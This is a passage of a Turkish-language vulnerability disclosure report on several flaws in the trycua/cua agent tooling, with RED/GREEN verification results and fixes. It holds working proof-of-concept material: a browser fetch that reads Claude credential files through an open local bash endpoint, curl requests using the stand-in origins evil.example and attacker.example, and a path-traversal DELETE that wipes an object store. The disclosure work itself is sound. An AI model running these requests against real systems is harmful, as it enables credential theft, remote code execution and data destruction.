* **Senaryo A — Geliştirici `cuabot` Açıkken Herhangi Bir Web Sayfasını Ziyaret Ettiğinde 0-Click Tarayıcı Üzerinden Komut Çalıştırma ve Claude Token Çalınması:**
  1. Bir yazılım geliştirici bilgisayarında `npx cuabot` komutunu başlatır; `cuabotd` arka planda `7842` portunu dinlemeye başlar.
  2. Geliştirici Chrome, Firefox veya Safari'de herhangi bir blog yazısı veya dokümantasyon sayfası açtığında, sayfanın içindeki birkaç satırlık JavaScript kodu `fetch("http://localhost:7842/bash", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"}) })` çağrısı yapar.
  3. `Access-Control-Allow-Origin: *` sayesinde tarayıcı hem komutu gönderir hem de dönen JSON yanıtını yabancı web sayfasına okutur; geliştiricinin Claude OAuth/API kimlik bilgileri saniyeler içinde çalınır.
* **Senaryo B — Yazılabilir `.claude/settings.json` Kancası (`hooks`) Üzerinden Konak Makinede Kalıcı Hakimiyet:**
  1. Yabancı web sayfası aynı `POST /bash` veya `new WebSocket("ws://localhost:7842/?command=...")` çağrısıyla `/home/community-user/.claude/settings.json` dosyasına zararlı bir `PreToolUse` kabuk kancası veya sahte `mcpServers` tanımı yazar.
  2. Bu dizin konak makinedeki `~/.cuabot/user/.claude` klasörüne yazılabilir (`read-write`) bağlı olduğu için, konteyner kapatılsa bile zararlı ayar konak diskte kalıcı olur.
* **Senaryo C — Kafe, Ortak Çalışma Alanı veya Kurumsal Wi-Fi Ağında (`0.0.0.0:7842`) Doğrudan LAN Ele Geçirme:**
  1. `server.listen(port)` çağrısı `0.0.0.0:7842` adresini dinlediği için, aynı Wi-Fi veya yerel ağdaki herhangi bir cihaz tarayıcıya bile ihtiyaç duymadan doğrudan `http://<gelistirici-lan-ip>:7842/bash` ve `/screenshot` uç noktalarına bağlanır.
  2. Saldırgan canlı ekran görüntülerini (`/screenshot`) izler, fare/klavye tıklamaları gönderir ve rastgele bash komutları çalıştırır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel loopback (127.0.0.1:7842) üzerinde yabancı bir web sitesinin (Origin: https://evil.example)
#    yaptığı CORS preflight (OPTIONS) ve POST /bash çağrısını simüle etme
curl -i -sS -X OPTIONS "http://127.0.0.1:7842/bash" \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"

curl -i -sS -X POST "http://127.0.0.1:7842/bash" \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && ls -la /home/community-user/.claude"}'
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-01": {
    "ghsa_id": "GHSA-cp36-x5hg-3gg8",
    "source_file": "cua/libs/cuabot/src/cuabotd.ts",
    "RED": {
      "http_status": 200,
      "access_control_allow_origin": "*",
      "driveby_bash_executed": true,
      "mounted_host_claude_credentials_exfiltrated": true
    },
    "GREEN": {
      "http_status": 403,
      "driveby_bash_executed": false,
      "mounted_host_claude_credentials_exfiltrated": false,
      "error": "Cross-origin browser requests forbidden"
    },
    "BENIGN": {
      "http_status": 200,
      "stdout": "authorized_cli_ok"
    }
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` `worker_server.py` Wildcard CORS, Fail-Open `OSGYM_ALLOWED_IPS` ve Kimlik Doğrulamasız `POST /reset` (`spec.loader.exec_module`) ile Uzaktan Kod Çalıştırma (`GHSA-xm8w-gj3g-4f25`, `CWE-94`/`CWE-942`, CVSS `8.8 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`pip: cua-bench-rl <= 0.1.0` ve `cua-bench <= 0.3.1`)
* **Etkilenen Sürüm & Bileşenler:** `cua-bench-rl <= 0.1.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py` (satır `79-108, 338-360, 499`) ve `libs/cua-bench/cua_bench/core.py` (`make`, satır `25-51`)
* **Zafiyet Sınıfı & Skor:** `CWE-94` (Kod Üretiminin Uygunsuz Kontrolü — Dinamik Kod Çalıştırma) / `CWE-942` (Aşırı İzin Verici CORS) — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-xm8w-gj3g-4f25` (`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
`cua-bench-rl` paketindeki `worker_server.py`, pekiştirmeli öğrenme (RL) işçi sunucusunu FastAPI üzerinde çalıştırır. Geliştirici dış erişimi kısıtlamak için `ip_filter_middleware` adında bir IP filtresi yazmış, ancak üç ölümcül tasarım hatası yapmıştır:
1. Sunucuya `CORSMiddleware(allow_origins=["*"])` eklemiştir (`satır 79-85`). Tarayıcıdan `http://127.0.0.1:8001/reset` adresine yapılan bir çapraz kökenli istekte kaynak IP `127.0.0.1` olduğu için IP filtresi isteği "yerel" sanıp içeri alır!
2. Ortam değişkeni `OSGYM_ALLOWED_IPS=""` (boş dizgi) olarak verilirse, `allowed_ips` listesi boş liste (`[]`) olur. Python'da `if allowed_ips and client_ip not in allowed_ips:` (`satır 102`) ifadesinde `bool([])` değeri `False` olduğu için **IP kontrolü tamamen atlanır (fail-open)** ve `0.0.0.0:8001` üzerindeki sunucu tüm ağa açılır!
3. Kimlik doğrulamasız `POST /reset` uç noktası (`satır 338-360`), kullanıcının JSON içinde gönderdiği `env_path` dizin yolunu doğrudan `cb.make(request.env_path)` fonksiyonuna (`cua_bench/core.py:25-51`) verir; o da o klasördeki `main.py` dosyasını `spec.loader.exec_module(module)` ile doğrudan konak Python sürecinde çalıştırır!

```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105 & 338-355
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # HATA 1: Herhangi bir web sitesinden tarayıcı isteğine izin verir!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    ...
    # HATA 2: OSGYM_ALLOWED_IPS="" ise allowed_ips=[] olur ve koşul False dönerek herkese açılır!
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)

@app.post("/reset")
async def reset_environment(request: ResetRequest):
    # HATA 3: request.env_path doğrulanmadan cb.make() -> spec.loader.exec_module(<env_path>/main.py) çağrılır!
    env = cb.make(request.env_path, ...)
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Yapay Zeka Araştırmacısı RL İşçilerini Çalıştırırken Tarayıcı Sekmesi Üzerinden (`POST /reset` -> `exec_module`) Konak Makinede Kod Çalıştırılması:**
  1. Bir ML mühendisi yerel makinesinde `cua-bench-rl` işçisini (`127.0.0.1:8001`) başlatır ve tarayıcıdan veri kümesi/model indirir.
  2. Ziyaret edilen bir web sayfası, indirilen bir paketin veya paylaşımlı dizinin yolunu vererek `fetch("http://127.0.0.1:8001/reset", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({env_path: "/home/community-user/Downloads/untrusted_bundle"})})` isteği atar.
  3. İstek `127.0.0.1` üzerinden geldiği için `ip_filter_middleware` onay verir ve `cua_bench.core.make` anında `/home/community-user/Downloads/untrusted_bundle/main.py` dosyasını konak Python sürecinde çalıştırır.
* **Senaryo B — GPU Kümesi / Docker Compose Dağıtımında Boş `OSGYM_ALLOWED_IPS=""` Değişkeniyle Tüm Ağa Fail-Open Açılma:**
  1. Kubernetes Helm veya Docker Compose şablonlarında `OSGYM_ALLOWED_IPS: ""` boş ortam değişkeni olarak tanımlanır.
  2. `allowed_ips` listesi `[]` olarak hesaplanır ve `if allowed_ips and ...` kontrolü `False` döndüğü için kümedeki veya yerel ağdaki her düğüm `0.0.0.0:8001/reset` üzerinden doğrudan Python kodu çalıştırabilir.
* **Senaryo C — `/screenshot` ve `/step` Uç Noktaları Üzerinden Sessiz Masaüstü Gözetleme ve Tuş Enjeksiyonu:**
  1. Diske hiçbir dosya yazmadan bile, tarayıcıdaki yabancı bir sekme veya ağdaki bir eş `GET /screenshot` uç noktasını yoklayarak çalışma ortamının Base64 ekran görüntülerini canlı izler.
  2. Ardından `POST /step` uç noktasına klavye/fare eylemleri göndererek açık terminale veya masaüstü oturumuna doğrudan işletim sistemi komutları yazar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel loopback üzerinde çapraz kökenli (Origin: https://attacker.example) POST /reset çağrısını test etme
curl -i -sS -X POST "http://127.0.0.1:8001/reset" \
  -H "Origin: https://attacker.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path": "/tmp/test_env_bundle", "task_index": 0}'

# 2. OSGYM_ALLOWED_IPS="" boş verildiğinde fail-open davranışını Python ile doğrulama
python3 -c '
allowed_ips = [ip.strip() for ip in "".split(",") if ip.strip()]
client_ip = "192.168.1.99"
blocked = bool(allowed_ips and client_ip not in allowed_ips)
print({"allowed_ips": allowed_ips, "remote_client_ip": client_ip, "blocked_by_filter": blocked})
'
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-02": {
    "ghsa_id": "GHSA-xm8w-gj3g-4f25",
    "source_file": "cua/libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py",
    "RED": {
      "cross_origin_reset_status": 200,
      "empty_allowed_ips_remote_lan_status": 200,
      "arbitrary_env_path_exec_module_rce": true
    },
    "GREEN": {
      "cross_origin_reset_status": 403,
      "empty_allowed_ips_remote_lan_status": 403,
      "outside_env_path_status": 400,
      "arbitrary_env_path_exec_module_rce": false
    },
    "BENIGN": {
      "loopback_valid_task_reset_status": 200
    }
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 Çok Parçalı Yükleme (`?uploadId=`) Yol Geçişi (`Path Traversal`) ve Koşulsuz `tokio::fs::remove_dir_all` ile Keyfi Dizin Silme (`GHSA-3x8g-6h2v-8qx9`, `CWE-22`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`Cargo: cua-compat <= 0.8.0` ve `cua-spacesd <= 0.8.0`)
* **Etkilenen Sürüm & Bileşenler:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-compat/src/daytona/objectstore.rs` (`handle`, satır `320-325, 360-422`)
* **Zafiyet Sınıfı & Skor:** `CWE-22` (Yol Adının Kısıtlı Dizinle Sınırlandırılmaması — Path Traversal ile Keyfi Dizin Silme) — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-3x8g-6h2v-8qx9` (`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
CUA'nın Daytona uyumlu S3 nesne deposunda (`objectstore.rs`), geliştirici ana dosya yolunu (`key`) `..` ile üst dizine kaçmaya karşı korumak için `object_path(&key)` adında güvenli bir fonksiyon yazmış ve hatta bunun için `keys_cannot_escape_the_store` adında birim testi eklemiştir.

Ancak S3 çok parçalı yükleme (Multipart Upload) protokolündeki ikinci parametre olan URL sorgu parametresi **`?uploadId=`** tamamen unutulmuştur! Daha da kötüsü, bir yüklemeyi iptal eden `HTTP DELETE` (`AbortMultipartUpload`) işleyicisinde (`satır 415-422`) şu iki satır yer alır:
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:414-422
(Method::DELETE, Some(id), _, _) => {
    // HATA 1: remove(&id) çağrısının Some(...) dönüp dönmediği (böyle bir yüklemenin var olup olmadığı) kontrol edilmiyor!
    d.objects.uploads.lock().await.remove(&id);
    // HATA 2: id içinde "../objects" varsa doğrudan root/uploads/../objects dizinini özyinelemeli olarak siler!
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Body::empty())
        .unwrap()
}
```
Rust'ta `PathBuf::join("../objects")` çağrısı `..` ifadelerini temizlemez; işletim sistemi `remove_dir_all(".../root/uploads/../objects")` yolunu `.../root/objects` olarak çözer. Üstelik `uploads.lock().await.remove(&id)` sonucuna bakılmadığı için saldırganın **önceden geçerli bir yükleme başlatmasına bile gerek yoktur**. Tek bir `DELETE /daytona/x?uploadId=../objects` isteğiyle sunucudaki tüm nesne deposu (`objects/`) veya `?uploadId=../../...` ile üst dizinler anında silinir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Tek Bir Sandbox Kiracısının Tüm Organizasyonun Sandbox İmajlarını ve Anlık Görüntülerini Silmesi (`?uploadId=../objects`):**
  1. Çoklu sandbox barındıran bir CUA Spaces / Daytona sunucusunda sıradan bir sandbox kiracısı `GET /api/object-storage/push-access` ile standart yükleme anahtarını alır.
  2. Kiracı tek bir HTTP isteği gönderir: `DELETE /daytona/dummy?uploadId=../objects`.
  3. `objectstore.rs:417` satırı `root/uploads/../objects` yolunu hedef alarak `tokio::fs::remove_dir_all` çalıştırır ve sunucudaki tüm kayıtlı sandbox imajlarını, yedekleri ve diğer kiracıların verilerini saniyeler içinde yok eder.
* **Senaryo B — `d.objects.root` Dışına Çıkarak Konak Uygulama Durumunun ve Veritabanı Dizinlerinin Silinmesi (`?uploadId=../../...`):**
  1. Saldırgan `?uploadId=../../state` veya `?uploadId=../../db` parametresiyle `DELETE` isteği gönderir.
  2. `Method::DELETE` kolu `id` değerinin bellekteki `uploads` tablosunda bulunup bulunmadığını kontrol etmediği için, `cua-spacesd` işleminin yazma izni olan herhangi bir üst konak dizini doğrudan silinir.
* **Senaryo C — `PUT` Parça Yükleme (`?partNumber=1&uploadId=../...`) ile Komşu Dizinlere Dosya Yazılması:**
  1. `Method::PUT` (`UploadPart`) işleyicisinde de (`satır 365`) `d.objects.root.join("uploads").join(&id)` kullanıldığı için, aktif bir yükleme kaydı oluşturulduğunda veya dizin yapısına göre `uploads/` dışındaki dizinlere parça dosyaları yazılabilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel test sunucusunda (127.0.0.1) önceden hiçbir yükleme başlatmadan
#    ?uploadId=../objects ile DELETE çağrısının etkisini doğrulama
curl -i -sS -X DELETE "http://127.0.0.1:8080/daytona/anykey?uploadId=../objects" \
  -H "Authorization: AWS4-HMAC-SHA256 Credential=daytona/20261029/us-east-1/s3/aws4_request"

# 2. Cargo test ile cua-compat nesne deposu birim testlerini çalıştırma
cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" -p cua-compat
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-03": {
    "ghsa_id": "GHSA-3x8g-6h2v-8qx9",
    "source_file": "cua/libs/cua/crates/cua-compat/src/daytona/objectstore.rs",
    "RED": {
      "delete_traversal_status": 204,
      "objects_store_wiped_without_prior_upload": true
    },
    "GREEN": {
      "delete_traversal_status": 400,
      "delete_uninitiated_id_status": 404,
      "objects_store_preserved": true
    },
    "BENIGN": {
      "valid_upload_abort_status": 204,
      "staging_dir_removed": true
    }
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe-Rust `VtEncoder::encode` (`pixel_buffer_for`) İçinde Eksik `NV12`/`BGRA` Düzlem ve Stride Sınır Doğrulaması Sonucu Yığın Bellek Aşımı (`Heap Over-Read`) ve Çökme (`GHSA-54v9-fxw3-36mm`, `CWE-125`/`CWE-190`, CVSS `5.5 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`Cargo: cua-media-codec <= 0.8.0`)
* **Etkilenen Sürüm & Bileşenler:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs` (`VtEncoder::pixel_buffer_for` ve `VtEncoder::encode`, satır `334-420, 471-479`)
* **Zafiyet Sınıfı & Skor:** `CWE-125` (Sınır Dışı Bellek Okuma — Out-of-bounds Read) / `CWE-190` (Tamsayı Taşması / Safe-Rust Sağlamlık İhlali) — **CVSS v3.1: `5.5 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-54v9-fxw3-36mm` (`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Rust dilinin en temel güvenlik sözleşmesi şudur: **Başında `unsafe` yazmayan halka açık (`pub fn`) bir fonksiyon, kendisine hangi parametre verilirse verilsin asla bellek sınırlarını aşamaz (Undefined Behavior / Buffer Over-read yapamaz).**

`cua-media-codec` içindeki `pub fn encode(&mut self, frame: &VideoFrame<'_>)` güvenli (safe) bir Rust fonksiyonudur ve Apple Silicon donanım H.264/HEVC kodlayıcısını (VideoToolbox) çalıştırmak için `self.pixel_buffer_for(frame)` fonksiyonunu çağırır. Aynı paketteki kardeş dosya `convert.rs:98-102` içinde geliştirici `y.len() < y_stride * (h - 1) + w` sınır kontrolünü doğruca yapmıştır. Ancak `videotoolbox/mod.rs:358-420` içindeki `FrameData::Nv12` kolunda **hiçbir uzunluk veya `stride` kontrolü yapmadan** doğrudan `unsafe` bloğuna girip ham işaretçi (pointer) kopyalaması yapmıştır:
```rust
// libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs:360-412
FrameData::Nv12 { y: yp, uv: uvp, y_stride: ys, uv_stride: uvs } => {
    y = yp;
    uv = uvp;
    y_stride = *ys as usize;
    uv_stride = *uvs as usize;
    // HATA: y.len(), uv.len(), y_stride < w veya uv_stride < row_bytes HİÇ KONTROL EDİLMİYOR!
}
...
unsafe {
    let base = CVPixelBufferGetBaseAddressOfPlane(pb, plane) as *mut u8;
    let dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, plane);
    for row in 0..rows {
        // y dilimi kısa verildiğinde src.as_ptr().add(row * src_stride) doğrudan komşu heap belleğini okur!
        std::ptr::copy_nonoverlapping(
            src.as_ptr().add(row * src_stride),
            base.add(row * dst_stride),
            row_bytes,
        );
    }
}
```
Örneğin `320x4` boyutunda bir video karesi için `1280` baytlık `y` düzlemi gerekirken `320` baytlık bir dilim verildiğinde, döngü durmaz; `y` diliminin bittiği yerden sonraki **`960` baytlık komşu yığın (heap) belleğini** (süreç içindeki API anahtarları, oturum verileri vb.) doğrudan Apple VideoToolbox `CVPixelBuffer` görüntü tamponuna kopyalar ve H.264 video akışı olarak karşı tarafa gönderir veya ayrılmamış belleğe denk gelirse `SIGSEGV` ile tüm medya sunucusunu çökertir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — macOS Uzak Masaüstü Yayınında Pencere / Çözünürlük Değişimi Sırasında Komşu Heap Belleğinin H.264 Video Karelerine Sızması:**
  1. Canlı bir macOS uzak masaüstü veya sanal makine yayını sırasında ekran yakalayıcı, çözünürlük başlığı (`width=320, height=4`) güncellenmiş ancak alt düzlem tamponu (`y.len() = 320`) henüz yeniden boyutlandırılmamış bir `FrameData::Nv12` karesini `VtEncoder::encode` metoduna iletir.
  2. Fonksiyon `CodecError::InvalidArgument` döndürmek yerine `y` diliminin sonrasındaki `960` baytlık komşu heap belleğini `CVPixelBuffer` parlaklık (luma) düzlemine kopyalar.
  3. Süreç belleğinde o sırada bulunan oturum jetonları veya başka kiracı verileri donanımsal H.264 karesine dönüştürülerek uzak izleyiciye yayınlanır.
* **Senaryo B — Safe-Rust Çağrısıyla Medya Sunucusunun (`cua-spacesd`) `SIGSEGV` İle Çökmesi:**
  1. Alt katmandaki bir Rust bileşeni, bozuk veya boş bir `FrameData::Nv12` (`y: &[], uv: &[]`) karesini `1920x1080` başlığıyla güvenli `encode()` fonksiyonuna verir.
  2. `src.as_ptr().add(row * src_stride)` eşlenmemiş (unmapped) bellek sayfasına erişir ve tüm `cua-spacesd` / medya yayın servisi anında `SIGSEGV` ile çöker.
* **Senaryo C — Kardeş Modüller (`convert.rs` vs `videotoolbox/mod.rs`) Arasındaki Doğrulama Eksikliğinden Kaynaklanan Stride Aşımı:**
  1. Yazılımsal dönüştürücü `convert::nv12_to_bgra` (`convert.rs:98-102`) kısa tamponları reddederken, Apple Silicon donanım hızlandırması (`videotoolbox`) devreye alındığında aynı girdi kontrolsüzce `unsafe` kopyalamaya girer ve donanım kodlayıcı hattında bellek bozulmasına yol açar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Apple Silicon donanımı üzerinde VideoToolbox sınır kontrolü testini çalıştırma
cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" \
  -p cua-media-codec --test videotoolbox_hw

# 2. Kısa NV12 tamponunda 960 baytlık komşu heap okumasını (RED) ve yamalı reddi (GREEN) doğrulama
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CUA-VT-01": {
    "ghsa_id": "GHSA-54v9-fxw3-36mm",
    "source_file": "cua/libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs",
    "geometry": {
      "width": 320,
      "height": 4,
      "y_stride": 320,
      "provided_y_len": 320,
      "required_y_len": 1280
    },
    "RED": {
      "oob_bytes_read": 960,
      "adjacent_heap_secret_copied_to_video_frame": true
    },
    "GREEN": {
      "oob_bytes_read": 0,
      "adjacent_heap_secret_copied_to_video_frame": false,
      "error_returned": "CodecError::InvalidArgument(NV12 plane buffer smaller than its geometry)"
    }
  }
}
```

---

### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — Kimlik Doğrulamasız `0.0.0.0:8006` (noVNC) ve Parolasız `0.0.0.0:3390` (RDP) Yerel Ağ İfşası + Yazılabilir Konak `/shared` Bağlaması (`GHSA-hvhg-6x47-cq96`, `CWE-668`/`CWE-732`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`pip: cua-bench <= 0.3.1`)
* **Etkilenen Sürüm & Bileşenler:** `<= 0.3.1` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench/tasks/winarena_adapter/cli.py` (`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`, satır `262-265, 421-424, 646-649`) ve `infra/vm/setup/server/main.py` (satır `180-248, 290-321`)
* **Zafiyet Sınıfı & Skor:** `CWE-668` (Kaynağın Yanlış Etki Alanına İfşası) / `CWE-732` (Kritik Kaynak İçin Yanlış İzin Ataması) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-hvhg-6x47-cq96` (`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Docker'da bir konteyner başlatırken `-p 8006:8006` yazmak ile `-p 127.0.0.1:8006:8006` yazmak arasında devasa bir güvenlik farkı vardır: Başında `127.0.0.1:` yoksa Docker portu **`0.0.0.0` (makinenin tüm Wi-Fi ve Ethernet ağ kartları)** üzerinde açar ve Linux'ta `iptables` `DOCKER` zinciri üzerinden yerel güvenlik duvarı (`ufw`) kurallarını bile atlayarak aynı ağdaki herkese yayınlar!

WinArena orkestratörü (`cli.py:262-265, 421-424, 646-649`), Windows değerlendirme sanal makinesini başlatan üç komutun tamamında şu argümanları kullanır:
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (ve 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # HATA 1: 0.0.0.0:8006 -> Parolasız noVNC web masaüstü tüm LAN'a açık!
"-p", f"{args.rdp_port}:3389",     # HATA 2: 0.0.0.0:3390 -> Parolasız Windows RDP tüm LAN'a açık!
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # HATA 3: Konak makinenin kurulum betikleri dizini yazılabilir (rw) bağlı!
```
Ayrıca Windows misafir sanal makinesinin içinde çalışan `infra/vm/setup/server/main.py:180-208` dosyası da `0.0.0.0:5000` üzerinde hiçbir parola/token sormadan `POST /execute_windows` isteğindeki Python kodunu doğrudan `exec(command)` ile çalıştırır. Böylece aynı ofis, üniversite veya laboratuvar ağındaki herhangi bir kişi tarayıcısından `http://<is-istasyonu-ip>:8006` adresine girerek Windows masaüstünü tam Administrator yetkisiyle devralır ve yazılabilir `/shared` bağlaması üzerinden konak makinedeki kurulum dosyalarını değiştirebilir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Üniversite veya Şirket Laboratuvar Ağındaki Herhangi Birinin `http://<host-ip>:8006` (noVNC) Üzerinden Windows Sanal Makinesini Ele Geçirmesi:**
  1. Bir araştırmacı ortak laboratuvar veya ofis ağına bağlı iş istasyonunda `cua-bench` WinArena görevlerini çalıştırır.
  2. Docker `8006` (noVNC) ve `3390` (RDP) portlarını `0.0.0.0` üzerinde yayınlar.
  3. Aynı ağdaki herhangi bir kullanıcı tarayıcısında `http://<is-istasyonu-ip>:8006` adresini açtığında hiçbir parola sorulmadan doğrudan Windows Administrator masaüstüne bağlanır ve test ortamına enjekte edilmiş OpenAI/Anthropic API anahtarlarını ve oturumlarını ele geçirir.
* **Senaryo B — Yazılabilir `-v {setup_path}:/shared` Bağlaması Üzerinden Misafir VM'den Konak Dosya Sisteminin Zehirlenmesi:**
  1. Konteyner, konak makinedeki `winarena_adapter/infra/vm/setup` klasörünü salt-okunur (`:ro`) yerine yazılabilir olarak `/shared` altına bağlar.
  2. `0.0.0.0:8006` / `0.0.0.0:3390` üzerinden sanal makineye giren saldırgan (veya VM içindeki ajanın ziyaret ettiği zararlı bir sayfa), `/shared` içindeki Python ve PowerShell kurulum betiklerine arka kapı yazar; bu değişiklik doğrudan konak makinenin diskine işlenir.
* **Senaryo C — Misafir VM İçindeki Kimlik Doğrulamasız `/execute_windows` (`exec()`) Kontrol Sunucusunun Tetiklenmesi:**
  1. Sanal makine içindeki `server/main.py:180-208` dosyası `/execute_windows` uç noktasına gelen dizgiyi doğrudan Python `exec(command)` fonksiyonuna verir ve `/setup/launch` uç noktasında `shell=True` kullanır.
  2. VM içindeki tarayıcıda çalışan bir ajan herhangi bir web sayfasını ziyaret ettiğinde veya yerel ağdan erişildiğinde, kimlik doğrulaması olmadığı için Windows işletim sisteminde rastgele komut çalıştırılır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. cli.py içindeki Docker port (-p) ve hacim (-v) bağlamalarını kaynak kodda inceleme
sed -n '258,270p' "$HOME/audit-targets/cua/libs/cua-bench/tasks/winarena_adapter/cli.py"

# 2. Uçtan uca WinArena port ve yazılabilir bağlama doğrulama testini çalıştırma
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CUA-CAND-06": {
    "ghsa_id": "GHSA-hvhg-6x47-cq96",
    "cli_source_file": "cua/libs/cua-bench/tasks/winarena_adapter/cli.py",
    "server_source_file": "cua/libs/cua-bench/tasks/winarena_adapter/infra/vm/setup/server/main.py",
    "RED": {
      "lan_exposed_ports": ["8006:8006", "3390:3389"],
      "host_setup_dir_mounted_writable": true,
      "guest_execute_windows_requires_auth": false
    },
    "GREEN": {
      "lan_exposed_ports": [],
      "host_setup_dir_mounted_writable": false,
      "guest_execute_windows_requires_auth": true
    }
  }
}
```

---

